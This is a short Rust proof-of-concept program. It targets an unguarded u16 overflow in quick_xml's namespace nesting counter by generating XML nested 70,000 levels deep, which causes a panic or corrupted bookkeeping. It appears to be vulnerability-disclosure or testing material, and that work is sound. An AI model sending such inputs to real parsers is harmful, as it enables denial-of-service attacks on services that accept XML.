// PoC: NamespaceResolver::push does an unguarded `nesting_level += 1` (u16) while pop uses
// saturating_sub. A document nested >65535 deep overflows the u16 counter.
//   overflow-checks ON  -> panic "attempt to add with overflow" (DoS)
//   overflow-checks OFF -> silent wrap 65535->0 -> namespace-scope bookkeeping corruption
use quick_xml::reader::NsReader;
use quick_xml::events::Event;

fn main() {
    let depth: usize = std::env::args().nth(1).and_then(|s| s.parse().ok()).unwrap_or(70000);
    let mut xml = String::with_capacity(depth * 8);
    for _ in 0..depth { xml.push_str("<a>"); }
    for _ in 0..depth { xml.push_str("</a>"); }
    eprintln!("input bytes = {}, depth = {}", xml.len(), depth);
    let mut r = NsReader::from_str(&xml);
    let mut n: u64 = 0;
    loop {
        match r.read_resolved_event() {
            Ok((_, Event::Eof)) => break,
            Ok(_) => { n += 1; }
            Err(e) => { eprintln!("Err after {} events: {:?}", n, e); break; }
        }
    }
    eprintln!("completed cleanly, {} events", n);
}
